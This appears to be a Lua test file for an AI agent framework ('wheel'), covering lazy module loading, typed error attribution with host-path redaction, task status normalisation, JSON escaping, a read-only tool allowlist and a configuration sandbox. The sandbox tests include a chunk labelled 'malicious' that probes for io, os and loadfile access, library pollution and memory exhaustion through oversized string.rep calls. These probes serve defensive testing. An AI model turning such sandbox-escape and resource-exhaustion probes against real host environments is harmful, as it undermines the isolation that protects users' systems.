    local fh = assert(io.open(path, "rb"))
    total = total + #fh:read("*a")
    fh:close()
  end
  return total
end

-- Real package.path fixtures for loader tests. These write only under the
-- repository's ephemeral scratch root and never stub the global `require`.
local MODULE_LOAD_FIXTURE_ROOT = test_path("test_wheel_module_loaders")
local REPO_PACKAGE_PATH = "./lua/?.lua;./lua/?/init.lua"

local function reset_module_fixture_root()
  os.execute("rm -rf " .. MODULE_LOAD_FIXTURE_ROOT
    .. " && mkdir -p " .. MODULE_LOAD_FIXTURE_ROOT)
end

local function write_fixture_file(relative, content)
  local path = MODULE_LOAD_FIXTURE_ROOT .. "/" .. relative
  local dir = path:match("^(.*)/[^/]+$")
  if dir then
    os.execute("mkdir -p " .. dir)
  end
  local fh = assert(io.open(path, "wb"), "cannot write fixture: " .. path)
  fh:write(content)
  fh:close()
end

local function read_repo_source(relative)
  local fh = assert(io.open(relative, "rb"))
  local src = fh:read("*a")
  fh:close()
  return src
end

local function detach_wheel_modules()
  local saved = {}
  for name, mod in pairs(package.loaded) do
    if is_wheel_module(name) then
      saved[name] = mod
      package.loaded[name] = nil
    end
  end
  return saved
end

local function restore_wheel_modules(saved)
  for name in pairs(package.loaded) do
    if is_wheel_module(name) then
      package.loaded[name] = nil
    end
  end
  for name, mod in pairs(saved) do
    package.loaded[name] = mod
  end
end

run_test("Wheel Init: required modules eager, optional modules lazy", function()
  local eager_bytes = read_eager_activation_bytes()
  assert(eager_bytes <= ACTIVATION_EAGER_SOURCE_BUDGET_BYTES,
    string.format("activation eager source budget exceeded: %d > %d bytes",
      eager_bytes, ACTIVATION_EAGER_SOURCE_BUDGET_BYTES))
  print(string.format("[INFO] activation eager source: %d bytes", eager_bytes))

  run_in_host_sandbox(function()
    local capture = new_command_capture()
    _G.bitty = {
      commands = { register = capture.register },
      notify = { show = function() return true end },
    }

    local wheel = require("wheel.init")
    assert_command_catalog(capture)

    for _, name in ipairs(EAGER_ACTIVATION_MODULES) do
      assert(package.loaded["wheel." .. name] ~= nil,
        "required module must load eagerly: wheel." .. name)
    end
    for _, name in ipairs(LAZY_ACTIVATION_MODULES) do
      assert(package.loaded["wheel." .. name] == nil,
        "optional module must not load eagerly: wheel." .. name)
    end

    -- hello and status answer without any optional submodule.
    assert(capture.defs["hello"].run().title == "Wheel")
    assert(capture.defs["status"].run().title == "Wheel Status")
    for _, name in ipairs(LAZY_ACTIVATION_MODULES) do
      assert(package.loaded["wheel." .. name] == nil,
        "hello/status must not load optional module: wheel." .. name)
    end

    -- First dispatch of `tools` loads the tool module and its lazy accessor.
    assert(capture.defs["tools"].run().title == "Wheel Tools Registry")
    assert(package.loaded["wheel.tool"] ~= nil,
      "the tools command must load wheel.tool on first use")
    assert(package.loaded["wheel.agent"] == nil,
      "a lazy first use must not load unrelated optional modules")
    local loaded_tool = assert(package.loaded["wheel.tool"])
    assert(wheel.tools == loaded_tool.get_default_registry(),
      "wheel.tools must expose the shared default registry")
  end)
end)

run_test("Wheel Init: missing required module is rooted and attributed", function()
  local entry_path = "lua/wheel/init.lua"
  local fh = assert(io.open(entry_path, "rb"))
  local entry_src = fh:read("*a")
  fh:close()
  local saved_path = package.path

  run_in_host_sandbox(function()
    local real_require = require
    _G.require = function(name)
      if name == "wheel.ui" then
        error("module 'wheel.ui' not found: no file '/host/private/lua/wheel/ui.lua'", 0)
      elseif name == "lua.wheel.ui" then
        error("module 'lua.wheel.ui' not found: no file '/host/private/lua/lua/wheel/ui.lua'", 0)
      end
      return real_require(name)
    end

    local ok, err = pcall(function()
      assert((loadstring or load)(entry_src, "@" .. entry_path))()
    end)
    _G.require = real_require

    assert(not ok, "activation must fail when a required module is missing")
    assert(type(err) == "table", "activation failure must be a typed table, got " .. type(err))

    local fields = 0
    for key in pairs(err) do
      assert(key == "class" or key == "code" or key == "message",
        "unexpected activation error field: " .. tostring(key))
      fields = fields + 1
    end
    assert(fields == 3, "activation failure must carry exactly class/code/message")
    assert(err.class == "resolution", "activation failure class must be resolution")
    assert(err.code == "E_MODULE_LOAD_FAILED",
      "activation failure must use E_MODULE_LOAD_FAILED")
    assert(type(err.message) == "string" and #err.message > 0,
      "activation failure must carry a message")
    assert(#err.message <= WheelErrors.MESSAGE_MAX_LENGTH,
      "activation failure message must stay within the bounded message length")
    assert(err.message:find("wheel.ui", 1, true) ~= nil,
      "activation failure must name the rooted module")
    assert(err.message:find("not found", 1, true) ~= nil,
      "activation failure must include the underlying cause")
    assert(err.message:find("/host/private", 1, true) == nil,
      "activation failure must not leak a host path")
    assert(err.message:find("\n", 1, true) == nil,
      "activation failure must stay on one line")
  end)

  -- Real package.path: a present-but-broken required module keeps the syntax
  -- cause rather than falling through to an absent alternate root.
  local saved_modules = detach_wheel_modules()
  reset_module_fixture_root()
  write_fixture_file("wheel/ui.lua", "this is not lua\n")
  package.path = MODULE_LOAD_FIXTURE_ROOT .. "/?.lua;" .. REPO_PACKAGE_PATH
  local broken_ok, broken_err = pcall(require, "wheel.init")
  package.path = saved_path
  restore_wheel_modules(saved_modules)

  assert(not broken_ok, "activation must fail when a required module is broken")
  assert(type(broken_err) == "table", "broken activation failure must be a typed table")
  assert(broken_err.class == "resolution" and broken_err.code == "E_MODULE_LOAD_FAILED",
    "broken activation failure must keep the typed resolution code")
  assert(broken_err.message:find("wheel.ui", 1, true) ~= nil,
    "broken activation failure must name the rooted module")
  assert(broken_err.message:find("ui.lua", 1, true) ~= nil,
    "broken activation failure must preserve the source location")
  assert(broken_err.message:find("near", 1, true) ~= nil,
    "broken activation failure must preserve the syntax cause")
  assert(broken_err.message:find("lua.wheel.ui", 1, true) == nil,
    "broken activation failure must not report the alternate root")
  assert(broken_err.message:find("not found", 1, true) == nil,
    "broken activation failure must not be reported as missing")

  -- Real package.path: the sibling loaders must preserve a rooted
  -- present-but-broken dependency, without trying the alternate root first.
  local sibling_cases = {
    {
      parent = "wheel.team",
      dep = "agent",
      label = "wheel.team: cannot load submodule 'wheel.agent'",
      broken = "this is not lua\n",
      marker = "near",
      location = "agent.lua",
      retry = true,
    },
    {
      parent = "wheel.context",
      dep = "config",
      label = "wheel.context: cannot load submodule 'wheel.config'",
      broken = "error('config exploded', 0)\n",
      marker = "config exploded",
      retry = true,
    },
    {
      parent = "wheel.commands",
      dep = "errors",
      label = "wheel.commands: cannot load sibling 'wheel.errors'",
      broken = "this is not lua\n",
      marker = "near",
      location = "errors.lua",
    },
  }

  for _, case in ipairs(sibling_cases) do
    local case_modules = detach_wheel_modules()
    reset_module_fixture_root()
    write_fixture_file("wheel/" .. case.dep .. ".lua", case.broken)
    package.path = MODULE_LOAD_FIXTURE_ROOT .. "/?.lua;" .. REPO_PACKAGE_PATH
    local case_ok, case_err = pcall(require, case.parent)
    local retry_ok, retry_err
    if case.retry then
      -- Clear only the parent's own Lua 5.1 sentinel; the loader must have
      -- cleared the dependency sentinel, so the retry reports the real cause.
      package.loaded[case.parent] = nil
      retry_ok, retry_err = pcall(require, case.parent)
    end
    package.path = saved_path
    restore_wheel_modules(case_modules)

    assert(not case_ok, case.parent .. " must fail when " .. case.dep .. " is broken")
    assert(type(case_err) == "string", case.parent .. " failure must be a string")
    assert(case_err:find(case.label, 1, true) ~= nil,
      case.parent .. " must attribute the rooted module: " .. case_err)
    assert(case_err:find(case.marker, 1, true) ~= nil,
      case.parent .. " must preserve the original cause: " .. case_err)
    if case.location then
      assert(case_err:find(case.location, 1, true) ~= nil,
        case.parent .. " must preserve the source location: " .. case_err)
    end
    assert(case_err:find("lua.wheel." .. case.dep, 1, true) == nil,
      case.parent .. " must not report the alternate root: " .. case_err)
    assert(case_err:find("not found", 1, true) == nil,
      case.parent .. " must not report a broken module as missing: " .. case_err)
    if case.retry then
      assert(not retry_ok, case.parent .. " must fail again after clearing its sentinel")
      assert(type(retry_err) == "string", case.parent .. " retry failure must be a string")
      assert(retry_err:find(case.label, 1, true) ~= nil,
        case.parent .. " retry must keep the rooted attribution: " .. retry_err)
      assert(retry_err:find(case.marker, 1, true) ~= nil,
        case.parent .. " retry must keep the original cause: " .. retry_err)
      assert(retry_err:find("loop or previous error", 1, true) == nil,
        case.parent .. " retry must not report the Lua 5.1 failed-require sentinel")
    end
  end

  -- The typed message built by init must keep the nested cause when a broken
  -- sibling fails through lazy dispatch, not just the raw require string.
  local dispatch_modules = detach_wheel_modules()
  reset_module_fixture_root()
  write_fixture_file("wheel/agent.lua", "this is not lua\n")
  package.path = MODULE_LOAD_FIXTURE_ROOT .. "/?.lua;" .. REPO_PACKAGE_PATH
  local dispatch_ok, dispatch_wheel = pcall(require, "wheel.init")
  package.path = saved_path
  restore_wheel_modules(dispatch_modules)

  assert(dispatch_ok, "activation must succeed while the optional agent stays lazy: "
    .. tostring(dispatch_wheel))
  local team_def
  for _, def in ipairs(dispatch_wheel.command_catalog) do
    if def.id == "team" then
      team_def = def
      break
    end
  end
  assert(team_def ~= nil, "the team command must be registered")

  -- The broken-agent fixture is still in place; dispatch through the lazy
  -- accessor so init builds the typed message.
  local lazy_modules = detach_wheel_modules()
  package.path = MODULE_LOAD_FIXTURE_ROOT .. "/?.lua;" .. REPO_PACKAGE_PATH
  local team_ok, team_err = pcall(team_def.run)
  package.path = saved_path
  restore_wheel_modules(lazy_modules)

  assert(not team_ok, "a broken lazy sibling must fail the team command")
  assert(type(team_err) == "table", "lazy sibling failure must be a typed table")
  assert(team_err.code == "E_MODULE_LOAD_FAILED",
    "lazy sibling failure must keep the typed resolution code")
  assert(team_err.message:find("wheel.team", 1, true) ~= nil,
    "lazy sibling failure must attribute the rooted module")
  assert(team_err.message:find("agent.lua", 1, true) ~= nil,
    "lazy sibling failure must preserve the source location: " .. team_err.message)
  assert(team_err.message:find("near", 1, true) ~= nil,
    "lazy sibling failure must preserve the nested syntax cause: " .. team_err.message)
  assert(team_err.message:find("lua.wheel.agent", 1, true) == nil,
    "lazy sibling failure must not report the alternate root")
  assert(#team_err.message <= WheelErrors.MESSAGE_MAX_LENGTH,
    "lazy sibling failure must stay within the bounded message length")

  -- Real package.path: a rooted name that is genuinely absent falls through to
  -- the alternate root. The temporary tree contains only lua/wheel/<dep>.lua,
  -- so every rooted `wheel.<dep>` lookup is a real not-found result.
  local alternate_cases = {
    { parent = "team", deps = { "errors", "agent", "context", "tool", "ui", "host" } },
    { parent = "context", deps = { "errors", "config", "host", "context_snapshot" } },
    {
      parent = "tool",
      deps = { "errors", "host" },
      -- tool.load_host consults typed-error detection, so the alternate-root
      -- errors fixture must expose the predicate rather than an empty table.
      fixtures = { errors = "return { is_typed = function() return false end }\n" },
    },
    { parent = "commands", deps = { "errors", "schema" } },
  }

  for _, case in ipairs(alternate_cases) do
    local case_modules = detach_wheel_modules()
    reset_module_fixture_root()
    for _, dep in ipairs(case.deps) do
      local content = (case.fixtures and case.fixtures[dep]) or "return {}\n"
      write_fixture_file("lua/wheel/" .. dep .. ".lua", content)
    end

    local source = read_repo_source("lua/wheel/" .. case.parent .. ".lua")
    package.path = MODULE_LOAD_FIXTURE_ROOT .. "/?.lua;"
      .. MODULE_LOAD_FIXTURE_ROOT .. "/?/init.lua"
    local case_ok, case_mod = pcall(function()
      return assert((loadstring or load)(source, "@lua/wheel/" .. case.parent .. ".lua"))()
    end)
    package.path = saved_path
    restore_wheel_modules(case_modules)

    assert(case_ok, case.parent .. " alternate-root fallback failed: " .. tostring(case_mod))
    assert(type(case_mod) == "table", case.parent .. " alternate root must return a module")
  end

  -- Non-ASCII path segments must be removed together with ASCII ones.
  local unicode_segment = "\195\169" -- UTF-8 e-acute, deliberately non-ASCII.
  local unicode_cause = WheelErrors.module_load_failed(
    "wheel.agent", "cannot open /tmp/" .. unicode_segment .. "/secret.txt")
  assert(unicode_cause.message:find(unicode_segment, 1, true) == nil,
    "module failure must not retain a non-ASCII path segment")
  assert(unicode_cause.message:find("<path>", 1, true) ~= nil,
    "module failure must replace the path with the bounded placeholder")
  assert(#unicode_cause.message <= WheelErrors.MESSAGE_MAX_LENGTH,
    "module failure must stay within the bounded message length")

  os.execute("rm -rf " .. MODULE_LOAD_FIXTURE_ROOT)
end)

run_test("Wheel Init: missing lazy module is attributed on first use", function()
  reset_module_fixture_root()
  os.execute("mkdir -p " .. MODULE_LOAD_FIXTURE_ROOT .. "/empty")
  write_fixture_file("broken/wheel/tool.lua", "error('tool exploded', 0)\n")

  run_in_host_sandbox(function()
    local capture = new_command_capture()
    _G.bitty = {
      commands = { register = capture.register },
      notify = { show = function() return true end },
    }

    local wheel = require("wheel.init")
    assert_command_catalog(capture)
    assert(package.loaded["wheel.tool"] == nil, "tool must start lazy")

    -- Real package.path: both rooted and alternate tool names are absent.
    local saved_path = package.path
    package.path = MODULE_LOAD_FIXTURE_ROOT .. "/empty/?.lua;"
      .. MODULE_LOAD_FIXTURE_ROOT .. "/empty/?/init.lua"
    local ok, err = pcall(capture.defs["tools"].run)
    package.path = saved_path

    assert(not ok, "a missing lazy module must fail its first use")
    assert(type(err) == "table", "lazy activation failure must be a typed table")
    assert(err.class == "resolution" and err.code == "E_MODULE_LOAD_FAILED",
      "lazy activation failure must keep the typed resolution code")
    assert(err.message:find("wheel.tool", 1, true) ~= nil,
      "lazy activation failure must name the rooted module")
    assert(err.message:find("not found", 1, true) ~= nil,
      "lazy activation failure must preserve the not-found cause")

    -- Real package.path: a present-but-broken optional module keeps its cause
    -- instead of being reported as a missing alternate-root module.
    package.path = MODULE_LOAD_FIXTURE_ROOT .. "/broken/?.lua;" .. REPO_PACKAGE_PATH
    local broken_ok, broken_err = pcall(capture.defs["tools"].run)
    package.path = saved_path

    assert(not broken_ok, "a broken lazy module must fail its first use")
    assert(type(broken_err) == "table", "broken lazy failure must be a typed table")
    assert(broken_err.class == "resolution" and broken_err.code == "E_MODULE_LOAD_FAILED",
      "broken lazy failure must keep the typed resolution code")
    assert(broken_err.message:find("wheel.tool", 1, true) ~= nil,
      "broken lazy failure must name the rooted module")
    assert(broken_err.message:find("tool exploded", 1, true) ~= nil,
      "broken lazy failure must preserve the runtime cause")
    assert(broken_err.message:find("lua.wheel.tool", 1, true) == nil,
      "broken lazy failure must not report the alternate root")
    assert(broken_err.message:find("not found", 1, true) == nil,
      "broken lazy failure must not be reported as missing")
    assert(wheel ~= nil, "activation must have succeeded before the lazy failure")
  end)

  os.execute("rm -rf " .. MODULE_LOAD_FIXTURE_ROOT)
end)

run_test("Wheel modules: typed loader denials stay typed and rooted", function()
  local saved_path = package.path
  local typed_host = [[
error({
  class = "runtime",
  code = "E_CAPABILITY_DENIED",
  message = "capability 'host.backend.standalone' is not granted",
}, 0)
]]

  local function assert_typed_load_failure(parent, fixtures)
    local saved_modules = detach_wheel_modules()
    reset_module_fixture_root()
    for relative, content in pairs(fixtures) do
      write_fixture_file(relative, content)
    end
    package.path = MODULE_LOAD_FIXTURE_ROOT .. "/?.lua;" .. REPO_PACKAGE_PATH

    local ok, err = pcall(require, parent)
    -- The loader clears the dependency's Lua 5.1 sentinel. Clear the parent's
    -- own sentinel to retry and prove the real denial is reported again.
    package.loaded[parent] = nil
    local retry_ok, retry_err = pcall(require, parent)

    package.path = saved_path
    restore_wheel_modules(saved_modules)

    assert(not ok, parent .. " must fail when the host seam denies")
    local denial = assert_typed_error(err, "E_CAPABILITY_DENIED")
    assert(denial.class == "runtime", parent .. " must keep the runtime class")
    assert(denial.message:find(parent, 1, true) ~= nil,
      parent .. " must attribute the loading module: " .. denial.message)
    assert(denial.message:find("wheel.host", 1, true) ~= nil,
      parent .. " must name the rooted dependency: " .. denial.message)
    assert(denial.message:find("host.backend.standalone", 1, true) ~= nil,
      parent .. " must preserve the denied capability: " .. denial.message)
    assert(denial.message:find("lua.wheel.host", 1, true) == nil,
      parent .. " must not report the alternate root: " .. denial.message)
    assert(denial.message:find("not found", 1, true) == nil,
      parent .. " must not report a typed denial as missing: " .. denial.message)

    assert(not retry_ok, parent .. " must fail again after clearing its sentinel")
    local retry_denial = assert_typed_error(retry_err, "E_CAPABILITY_DENIED")
    assert(retry_denial.message == denial.message,
      parent .. " retry must preserve the annotated typed cause")
    assert(retry_denial.message:find("loop or previous error", 1, true) == nil,
      parent .. " retry must not report the Lua 5.1 failed-require sentinel")
  end

  assert_typed_load_failure("wheel.context", {
    ["wheel/config.lua"] = "return {}\n",
    ["wheel/host.lua"] = typed_host,
  })

  assert_typed_load_failure("wheel.team", {
    ["wheel/agent.lua"] = "return {}\n",
    ["wheel/context.lua"] = "return {}\n",
    ["wheel/tool.lua"] = "return {}\n",
    ["wheel/ui.lua"] = "return {}\n",
    ["wheel/host.lua"] = typed_host,
  })

  os.execute("rm -rf " .. MODULE_LOAD_FIXTURE_ROOT)
end)

-- ===========================================================================
-- 5. Wire Normalization and Null Semantics Tests
-- ===========================================================================

run_test("Wheel: Wire format normalization and null task semantics", function()
  local kernel = WheelKernel.new_mock()

  -- 1. Missing task returns nil (matching Rust null data payload)
  local missing = kernel:get_task("nonexistent-999")
  assert(missing == nil, "missing task should return nil")

  -- 2. Mock task.create sets snake_case status, assigned_agent, failure_reason
  local t = kernel:create_task({ id = "NORM-1", title = "Normalize Test" })
  assert(t.status == "ready", "status should be snake_case ready")
  assert(t.assigned_agent == nil)

  local started = kernel:start_task("NORM-1", "worker-wire-01")
  assert(started.status == "running", "status should be snake_case running")
  assert(started.assigned_agent == "worker-wire-01")
  assert(started.worker_id == "worker-wire-01")

  local failed = kernel:fail_task("NORM-1", 1, "test failure reason")
  assert(failed.status == "failed", "status should be snake_case failed")
  assert(failed.failure_reason == "test failure reason")
  assert(failed.error == "test failure reason")

  -- 3. UI format_graph renders snake_case status badges and failure_reason
  local graph_str = WheelUI.format_graph(kernel)
  assert(graph_str:find("%[✗%] NORM%-1") ~= nil, "should render failed badge for snake_case status")
  assert(graph_str:find("err:%s+test failure reason") ~= nil, "should render failure_reason")

  -- 4. UI format_graph also correctly renders legacy PascalCase tasks
  local custom_kernel = WheelKernel.new(function(cmd, payload)
    if cmd == "kernel.status" then
      return '{"success":true,"data":{"active_task":null,"task_count":1,"slot_count":0}}'
    elseif cmd == "task.list" then
      return '{"success":true,"data":[{"id":"PASCAL-1","title":"Legacy","status":"Ready","dependencies":[]}]}'
    end
    return '{"success":false,"error":"unsupported"}'
  end)
  local pascal_graph = WheelUI.format_graph(custom_kernel)
  assert(pascal_graph:find("%[•%] PASCAL%-1") ~= nil, "should render ready badge for PascalCase status")

  -- 5. Agent execute_task accepts lowercase ready
  local exec_kernel = WheelKernel.new_mock()
  exec_kernel:create_task({ id = "EXEC-1", title = "Exec Test" })
  local worker = WheelAgent.new({
    name = "worker-norm",
    role = WheelAgent.Role.CODING,
    kernel = exec_kernel,
  })
  local outcome = worker:execute_task("EXEC-1", function(agent, ctx, iter)
    return { done = true }
  end)
  assert(outcome.success == true)
  assert(outcome.task.status == "succeeded")

  -- 6. Agent review_task accepts lowercase succeeded
  local reviewer = WheelAgent.new({
    name = "reviewer-norm",
    role = WheelAgent.Role.REVIEWER,
    kernel = exec_kernel,
  })
  local rev = reviewer:review_task("EXEC-1", function(agent, task, history)
    assert(task.status == "succeeded")
    return true, "approved"
  end)
  assert(rev.approved == true)

  -- 7. UI format_graph renders assigned worker
  assert(graph_str:find("worker:%s+worker%-wire%-01") ~= nil, "should render assigned worker")

  -- 8. UI format_graph falls back to error when failure_reason is empty string
  local fallback_kernel = WheelKernel.new(function(cmd, payload)
    if cmd == "kernel.status" then
      return '{"success":true,"data":{"active_task":null,"task_count":1,"slot_count":0}}'
    elseif cmd == "task.list" then
      return '{"success":true,"data":[{"id":"ERR-1","title":"Fallback","status":"failed","failure_reason":"","error":"fallback error message"}]}'
    end
    return '{"success":false,"error":"unsupported"}'
  end)
  local fallback_graph = WheelUI.format_graph(fallback_kernel)
  assert(fallback_graph:find("err:%s+fallback error message") ~= nil, "empty failure_reason should fall back to error")

  -- 9. Agent execute_task rejects task already assigned to a different worker
  exec_kernel:create_task({ id = "ASSIGN-1", title = "Assigned task", assigned_agent = "other-worker" })
  local conflict_worker = WheelAgent.new({
    name = "my-worker",
    role = WheelAgent.Role.CODING,
    kernel = exec_kernel,
  })
  local ok_conflict, conflict_err = pcall(function()
    conflict_worker:execute_task("ASSIGN-1", function() return { done = true } end)
  end)
  assert(conflict_err:find("already assigned to other%-worker") ~= nil)

  -- 10. UI format_graph falls back to worker_id when assigned_agent is empty string
  local worker_fallback_kernel = WheelKernel.new(function(cmd, payload)
    if cmd == "kernel.status" then
      return '{"success":true,"data":{"active_task":null,"task_count":1,"slot_count":0}}'
    elseif cmd == "task.list" then
      return '{"success":true,"data":[{"id":"WORK-1","title":"Fallback Worker","status":"running","assigned_agent":"","worker_id":"legacy-worker"}]}'
    end
    return '{"success":false,"error":"unsupported"}'
  end)
  local worker_fallback_graph = WheelUI.format_graph(worker_fallback_kernel)
  assert(worker_fallback_graph:find("worker:%s+legacy%-worker") ~= nil, "empty assigned_agent should fall back to worker_id")

  -- 11. Agent execute_task rejects task when assigned_agent is empty string but worker_id is other worker
  local empty_agent_kernel = WheelKernel.new(function(cmd, payload)
    if cmd == "kernel.status" then
      return '{"success":true,"data":{"active_task":null,"task_count":1,"slot_count":0}}'
    elseif cmd == "task.get" then
      return '{"success":true,"data":{"id":"WORK-2","title":"Worker Task","status":"ready","assigned_agent":"","worker_id":"other-worker","dependencies":[]}}'
    end
    return '{"success":false,"error":"unsupported"}'
  end)
  local conflict_worker2 = WheelAgent.new({
    name = "my-worker",
    role = WheelAgent.Role.CODING,
    kernel = empty_agent_kernel,
  })
  local ok_conflict2, conflict_err2 = pcall(function()
    conflict_worker2:execute_task("WORK-2", function() return { done = true } end)
  end)
  assert(not ok_conflict2, "should reject task when worker_id is set to another worker")
  assert(conflict_err2:find("already assigned to other%-worker") ~= nil)
end)

-- ===========================================================================
-- 6. Pure-Lua JSON Codec Control Character Escaping Tests
-- ===========================================================================

run_test("WheelKernel.JSON: control character escaping and roundtrip", function()
  local codec = WheelKernel.JSON
  assert(codec ~= nil, "WheelKernel.JSON fallback codec must be exported")

  -- 1. NUL (0x00)
  local nul_str = "hello\0world"
  local enc_nul = codec.encode(nul_str)
  assert(enc_nul:find("\\u0000") ~= nil, "should escape NUL byte as \\u0000")
  local dec_nul = codec.decode(enc_nul)
  assert(dec_nul == nul_str, "decoded NUL string must match original")

  -- 2. ANSI Escape sequence (0x1B = ESC)
  local ansi_str = "\27[32mSUCCESS\27[0m"
  local enc_ansi = codec.encode(ansi_str)
  assert(enc_ansi:find("\\u001b") ~= nil, "should escape ESC byte as \\u001b")
  local dec_ansi = codec.decode(enc_ansi)
  assert(dec_ansi == ansi_str, "decoded ANSI string must match original")

  -- 3. BEL (0x07) and other C0 control chars
  local c0_str = "bell:\7,soh:\1,etx:\3,syn:\22"
  local enc_c0 = codec.encode(c0_str)
  assert(enc_c0:find("\\u0007") ~= nil, "should escape BEL as \\u0007")
  assert(enc_c0:find("\\u0001") ~= nil, "should escape SOH as \\u0001")
  assert(enc_c0:find("\\u0003") ~= nil, "should escape ETX as \\u0003")
  assert(enc_c0:find("\\u0016") ~= nil, "should escape SYN as \\u0016")
  local dec_c0 = codec.decode(enc_c0)
  assert(dec_c0 == c0_str, "decoded C0 control string must match original")

  -- 4. Standard whitespace escapes preserved
  local ws_str = "tab:\t,nl:\n,cr:\r"
  local enc_ws = codec.encode(ws_str)
  assert(enc_ws:find("\\t") ~= nil, "should escape tab as \\t")
  assert(enc_ws:find("\\n") ~= nil, "should escape newline as \\n")
  assert(enc_ws:find("\\r") ~= nil, "should escape cr as \\r")
  local dec_ws = codec.decode(enc_ws)
  assert(dec_ws == ws_str, "decoded whitespace string must match original")

  -- 5. Complex nested table with mixed control characters
  local complex_tbl = {
    ansi = ansi_str,
    nul = nul_str,
    nested = { count = 42, note = "test\0001" },
  }
  local enc_tbl = codec.encode(complex_tbl)
  local dec_tbl = codec.decode(enc_tbl)
  assert(dec_tbl.ansi == ansi_str)
  assert(dec_tbl.nul == nul_str)
  assert(dec_tbl.nested.count == 42)
  assert(dec_tbl.nested.note == "test\0001")
end)

-- ===========================================================================
-- 7. Expanded Read-Only Tool Allowlist Tests
-- ===========================================================================

run_test("WheelAgent: expanded read-only tool allowlist", function()
  assert(type(WheelAgent.READ_ONLY_TOOLS) == "table", "WheelAgent.READ_ONLY_TOOLS must be exported")

  local expected_tools = {
    "read_file",
    "view_file",
    "search_code",
    "find_files",
    "list_directory",
    "inspect",
    "git_diff",
    "git_log",
    "git_status",
    "read_resource",
    "list_resources",
    "read_url_content",
    "search_web",
    "ask_question",
    "get_outline",
  }

  for _, tool in ipairs(expected_tools) do
    assert(WheelAgent.READ_ONLY_TOOLS[tool] == true, "tool " .. tool .. " must be in READ_ONLY_TOOLS")
  end

  local researcher = WheelAgent.new({
    name = "research-tester",
    role = WheelAgent.Role.RESEARCH,
    kernel = WheelKernel.new_mock(),
    tools = expected_tools,
  })

  -- All 15 tools must be allowed for Research role
  for _, tool in ipairs(expected_tools) do
    local allowed, err = researcher:is_tool_allowed(tool)
    assert(allowed == true, "researcher should be allowed " .. tool .. ": " .. tostring(err))
  end

  -- Mutating tools must be denied
  local mutating_tools = { "write_file", "apply_diff", "run_command", "replace_file_content" }
  for _, tool in ipairs(mutating_tools) do
    local allowed, err = researcher:is_tool_allowed(tool)
    assert(allowed == false, "researcher must be denied mutating tool " .. tool)
  end
end)

-- ===========================================================================
-- 8. Wheel Configuration System and Security Gates (CTX-0011)
-- ===========================================================================

run_test("WheelConfig: 8 function classes schema and default values", function()
  assert(_G.WheelHost == nil, "requiring wheel.config must not leak WheelHost into _G")
  assert(type(WheelConfig.DEFAULTS) == "table", "DEFAULTS must be a table")
  local d = WheelConfig.DEFAULTS

  -- 1. Roles
  assert(type(d.roles) == "table", "roles must be defined")
  assert(d.roles.commander and d.roles.commander.name == "commander")
  assert(d.roles.coding and d.roles.coding.name == "worker-coding")
  assert(d.roles.debug and d.roles.debug.name == "worker-debug")
  assert(d.roles.research and d.roles.research.name == "worker-research")
  assert(d.roles.reviewer and d.roles.reviewer.name == "reviewer")

  -- 2. Directives
  assert(type(d.directives) == "table" and #d.directives >= 2)

  -- 3. Tools
  assert(type(d.tools) == "table" and type(d.tools.allow) == "table")

  -- 4. Skills
  assert(type(d.skills) == "table" and type(d.skills.disabled) == "table")

  -- 5. Verification
  assert(type(d.verification) == "table" and d.verification.change_gated == true)
  assert(d.verification.test_command == "just check")

  -- 6. Context
  assert(type(d.context) == "table" and d.context.max_budget_bytes == 65536)
  assert(d.context.zone1_max_bytes == 16384)
  assert(d.context.zone2_max_bytes == 32768)
  assert(d.context.zone3_max_bytes == 16384)

  -- 7. Headless Panel container policy
  assert(type(d.panel) == "table", "panel policy must be defined")
  assert(d.panel.headless == true, "agent must default to headless = true")

  -- 8. Lifecycle hooks
  assert(type(d.hooks) == "table")
end)

run_test("WheelConfig: compute_hash deterministic 64-hex string", function()
  local str1 = "return { verification = { change_gated = true } }"
  local str2 = "return { verification = { change_gated = false } }"

  local h1_a = WheelConfig.compute_hash(str1)
  local h1_b = WheelConfig.compute_hash(str1)
  local h2 = WheelConfig.compute_hash(str2)

  assert(#h1_a == 64, "hash must be 64 characters hex")
  assert(h1_a:match("^%x+$") ~= nil, "hash must be valid hex")
  assert(h1_a == h1_b, "identical content must produce identical hash")
  assert(h1_a ~= h2, "different content must produce different hash")

  -- NIST SHA-256 test vectors
  assert(
    WheelConfig.compute_hash("abc") == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
    "NIST SHA-256 vector for 'abc'"
  )
  assert(
    WheelConfig.compute_hash("") == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "NIST SHA-256 vector for empty string"
  )
end)

run_test("WheelConfig: sandboxed evaluation restricts ambient authority", function()
  local malicious = [[
    local has_io = (io ~= nil)
    local has_os = (os ~= nil)
    local has_loadfile = (loadfile ~= nil)
    -- Attempt to mutate standard library in sandbox
    string.polluted = true
    return {
      has_io = has_io,
      has_os = has_os,
      has_loadfile = has_loadfile,
      safe_val = 12345,
    }
  ]]
  local ok_eval, tbl = WheelConfig.eval_chunk(malicious, "malicious_test")
  assert(ok_eval == true, "chunk should eval without crashing host")
  assert(tbl.has_io == false, "ambient io must not be accessible in sandbox")
  assert(tbl.has_os == false, "ambient os must not be accessible in sandbox")
  assert(tbl.has_loadfile == false, "loadfile must not be accessible in sandbox")
  assert(tbl.safe_val == 12345, "safe variables should evaluate properly")
  assert(string.polluted == nil, "standard library tables must be isolated from sandbox mutation")

  -- Instruction-hook and memory-bound hardening: pcall/xpcall are absent, the
  -- string/table wrappers reject numeric strings and cap per-call and total
  -- allocation, and error text does not leak the harness source path.
  local pcall_probe = [[
    return {
      has_pcall = pcall ~= nil,
      has_xpcall = xpcall ~= nil,
    }
  ]]
  local ok_pcall, pcall_tbl = WheelConfig.eval_chunk(pcall_probe, "pcall_probe")
  assert(ok_pcall == true, "the pcall probe must evaluate")
  assert(pcall_tbl.has_pcall == false, "pcall must not be exposed to project configuration")
  assert(pcall_tbl.has_xpcall == false, "xpcall must not be exposed to project configuration")

  local big_rep = "return { big = string.rep('A', 2097152) }"
  local ok_rep, err_rep = WheelConfig.eval_chunk(big_rep, "big_rep_test")
  assert(ok_rep == false, "string.rep above the per-call cap must fail closed")
  assert(string.find(tostring(err_rep), "safety bound") ~= nil,
    "error message specifies the safety bound")
  assert(string.find(tostring(err_rep), "wheel/config.lua", 1, true) == nil,
    "sandbox bounds errors must not leak the harness source path")

  local numeric_rep = "return { big = string.rep('A', '200000') }"
  local ok_numeric, err_numeric = WheelConfig.eval_chunk(numeric_rep, "numeric_rep_test")
  assert(ok_numeric == false, "a numeric-string string.rep count must fail closed")
